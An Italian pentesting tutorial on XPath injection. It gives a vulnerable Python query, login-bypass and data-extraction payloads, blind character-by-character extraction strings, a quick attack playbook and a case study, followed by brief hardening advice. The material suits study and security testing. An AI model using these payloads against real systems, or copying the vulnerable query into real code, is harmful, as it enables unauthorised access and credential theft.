---
title: 'XPath Injection: Bypass Login ed Estrazione Dati da XML'
slug: xpath-injection
description: 'XPath Injection nel pentesting: bypass autenticazione, estrazione dati da documenti XML e tecniche di blind XPath injection nelle applicazioni enterprise.'
image: /xpath-injection.webp
draft: true
date: 2026-03-20T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - xpath-injection
  - injection-attacks
---

Se la [SQL Injection](https://hackita.it/articoli/sql-injection) attacca i database relazionali, la **XPath Injection** attacca i **documenti XML** interrogati con **XPath** (XML Path Language). Sembra un attacco di nicchia — "chi usa ancora XML come database?" — ma la risposta è: più applicazioni di quante pensi. Sistemi legacy enterprise, file di configurazione con credenziali, cataloghi prodotti in XML, sistemi SOAP, applicazioni SharePoint, e tutti quei portali che usano un file XML per l'autenticazione invece di un vero database.

Il concetto è identico alla SQLi: l'applicazione costruisce una query (XPath invece di SQL) concatenando l'input utente, e l'attaccante manipola la logica per bypassare l'autenticazione o estrarre dati. La sintassi cambia, ma il principio è lo stesso.

La trovo nel **5% dei pentest su applicazioni enterprise** — rara ma con impatto alto perché i file XML spesso contengono credenziali, configurazioni e dati sensibili.

Satellite operativo della [guida pillar Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa).

## Cos'è la XPath Injection?

La XPath Injection è una vulnerabilità in cui l'input dell'utente viene inserito in una **query XPath** senza sanitizzazione. XPath è un linguaggio per navigare e interrogare documenti XML, analogamente a come SQL interroga database relazionali. L'attaccante manipola la query XPath per alterarne la logica — tipicamente per bypassare l'autenticazione o estrarre dati dal documento XML.

> **È pericolosa?**
> Sì — porta a **bypass autenticazione**, **estrazione completa del documento XML** (credenziali, configurazioni, dati personali), e non è limitata da permessi come la SQLi (XPath accede a tutto il documento). Trovata nel **5% dei pentest** su applicazioni enterprise.

## Authentication Bypass — Step by Step

### Il documento XML target

```xml
<?xml version="1.0"?>
<users>
  <user>
    <username>admin</username>
    <password>SuperSecret123!</password>
    <role>administrator</role>
    <email>admin@company.com</email>
  </user>
  <user>
    <username>maria.rossi</username>
    <password>Maria2024!</password>
    <role>user</role>
    <email>m.rossi@company.com</email>
  </user>
</users>
```

### Il codice vulnerabile

```python
# ❌ VULNERABILE
xpath_query = f"//user[username='{username}' and password='{password}']"
result = xml_tree.xpath(xpath_query)
```

### Bypass #1 — OR tautology

```
Username: admin' or '1'='1
Password: admin' or '1'='1

# Query: //user[username='admin' or '1'='1' and password='admin' or '1'='1']
# '1'='1' è sempre TRUE → match su tutti gli utenti
```

### Bypass #2 — Comment out password

```
Username: admin' or '1'='1' or '1'='1
Password: qualsiasi

# Effetto: la condizione sulla password è irrilevante
```

### Bypass #3 — Chiusura predicato

```
Username: admin']/*
Password: qualsiasi

# Query: //user[username='admin']/*
# Seleziona tutti i figli del nodo user dove username='admin'
# → ritorna tutti gli attributi di admin
```

## Data Extraction

### Estrarre tutti gli utenti

```
Username: '] | //user/username | //user['
Password: qualsiasi

# Query: //user[username=''] | //user/username | //user[''=password='qualsiasi']
# //user/username → tutti gli username
```

### Estrarre le password

```
Username: '] | //user/password | //user['
# → tutte le password
```

## Blind XPath Injection

Se la risposta non mostra dati ma solo "login riuscito/fallito":

```
# Il primo carattere dello username del primo utente è 'a'?
' or substring(//user[1]/username, 1, 1)='a' and '1'='1

# Se login → TRUE → primo carattere è 'a'

# Binary search con string-length
' or string-length(//user[1]/password) > 10 and '1'='1
# → la password ha più di 10 caratteri?

# Character by character con substring
' or substring(//user[1]/password, 1, 1)='S' and '1'='1
' or substring(//user[1]/password, 2, 1)='u' and '1'='1
# → S, u, p, e, r, S, e, c, r, e, t, 1, 2, 3, !
```

Identico alla [Blind SQLi](https://hackita.it/articoli/blind-sql-injection) ma con funzioni XPath.

## 🏢 Enterprise Escalation

```
XPath Injection → bypass auth → accesso admin al portale
→ il file XML contiene credenziali di servizio
→ credenziali per LDAP/database/API interne
→ lateral movement → Domain Admin
```

## Micro Playbook Reale

**Minuto 0-3 →** Testa `' or '1'='1` come username e password
**Minuto 3-10 →** Se bypass: estrai dati con `'] | //user/password | //user['`
**Minuto 10-30 →** Se blind: extraction character by character

## Caso Studio Concreto

**Settore:** PMI manifatturiera, portale ordini B2B, backend XML.
**Scope:** Black-box.

Login form. `admin' or '1'='1` → accesso come primo utente (admin). Extraction delle password: `'] | //user/password | //user['` → 15 password in chiaro. Una delle password era riusata per il VPN aziendale → accesso alla rete interna.

**Tempo: 10 minuti dall'injection all'accesso VPN.**

## Detection & Hardening

* **Query XPath parametrizzate** (se il linguaggio le supporta)
* **Whitelist input** — solo alfanumerici per username
* **Non usare XML come backend di autenticazione** — usa un database con hashing
* **Escape dei caratteri speciali XPath**: `'`, `"` nell'input

***

Satellite della [Guida Completa Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa). Vedi anche: [LDAP Injection](https://hackita.it/articoli/ldap-injection), [SQL Injection](https://hackita.it/articoli/sql-injection-guida-completa).
